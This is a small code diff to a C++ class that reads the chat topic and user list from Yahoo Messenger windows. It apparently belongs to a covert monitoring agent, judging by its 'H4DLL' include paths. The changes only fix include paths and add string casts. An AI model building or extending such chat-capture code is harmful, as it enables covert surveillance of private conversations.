@@ -13,21 +13,22 @@
 using namespace std;
 
 #include "QYim9.h"
-#include "..\HM_SafeProcedures.h"
-#include "..\common.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
+#include "../../H4DLL/common.h"
+
 #define MIN_SEARCH_LENGTH 200
 
 PWCHAR QYim9::wChatTree[] = {
-	L"ATL:007C07F0",
-	L"YHTMLContainer",
-	L"Internet Explorer_Server",
+	(PWCHAR)L"ATL:007C07F0",
+	(PWCHAR)L"YHTMLContainer",
+	(PWCHAR)L"Internet Explorer_Server",
 	0
 };
 
 PWCHAR QYim9::wChatUserListTree[] = {
-	L"YSearchMenuWndClass",
-	L"IMClass",
-	L"SysListView32",
+	(PWCHAR)L"YSearchMenuWndClass",
+	(PWCHAR)L"IMClass",
+	(PWCHAR)L"SysListView32",
 	0
 };
 
@@ -43,7 +44,7 @@ QYim9::QYim9(HWND hw) : QYim8(hw)
 	if(HM_SafeGetWindowTextW(hw, wTopic, 256))
 		properties.SetId(wTopic);
 	else
-		properties.SetId(L"");
+		properties.SetId((PWCHAR)L"");
 }
 
 QYim9::~QYim9()
@@ -367,7 +368,7 @@ BOOL QYim9::GrabTopic()
 	if(HM_SafeGetWindowTextW(ole.GetHandle(), wTopic, 256))
 		properties.SetId(wTopic);
 	else
-		properties.SetId(L"");
+		properties.SetId((PWCHAR)L"");
 
 	return TRUE;
 }
@@ -393,7 +394,7 @@ BOOL QYim9::GrabUserList()
 
 		properties.AppendUser((WCHAR *)strTopic.c_str(), FALSE);
 	} else
-		properties.AppendUser(L"", TRUE);
+		properties.AppendUser((PWCHAR)L"", TRUE);
 
 	return TRUE;
 }
